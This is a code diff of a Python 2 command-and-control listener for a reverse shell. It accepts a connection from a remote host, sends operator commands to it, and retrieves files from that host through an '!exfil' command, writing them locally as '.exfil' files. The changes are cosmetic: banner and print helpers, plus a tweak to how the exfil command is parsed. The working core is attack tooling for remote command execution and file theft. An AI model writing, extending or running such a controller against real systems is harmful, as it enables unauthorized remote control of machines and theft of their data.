@@ -2,22 +2,24 @@
 
 import socket
 import os
+from lib.banner import *
+from lib.functions import *
 
 
-
-
-
+#
+#
+#
 def transfer(conn, file):
 	f = open(file + '.exfil', 'wb')
 	while True:
 		bits = conn.recv(1024)
 		if 'File not found' in bits:
-			print '[-] File not found'
+			print_error("File not found")
 			break
 		if bits.endswith('!EXFIL'):
 			idx = bits.find('!EXFIL')
 			f.write(bits[0:idx])
-			print '[+] Exfil complete'
+			print_success("Exfil complete")
 			break
 		else:
 			f.write(bits)
@@ -25,20 +27,19 @@ def transfer(conn, file):
 	f.close()
 
 
-
-
-
-
+#
+#
+#
 def connect():
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	s.bind(('localhost', 8080))
 	s.listen(1)
-	print '[+] Listening.'
+	print_info("Listening for connection.")
 	conn, addr = s.accept()
-	print '[+] Connection received from: ', addr
+	print_success("Connection received from: " + addr[0] + ":" + str(addr[1]))
 
 	while True:
-		cmd = raw_input(addr[0] + ">> ")
+		cmd = raw_input(prompt(addr[0]))
 
 		if '!quit' in cmd:
 			conn.send('!quit')
@@ -46,7 +47,7 @@ def connect():
 			break
 
 		elif '!exfil' in cmd:
-			exfil,file = cmd.split("*")
+			exfil,file = cmd.split("!exfil ")
 			conn.send(cmd)
 			transfer(conn,file)
 
@@ -55,14 +56,15 @@ def connect():
 			print conn.recv(1024)
 
 
-
-
-
+#
+#
+#
 def main():
+	print(srvbanner)
 	connect()
 
 
-
-
-
+#
+#
+#
 main()
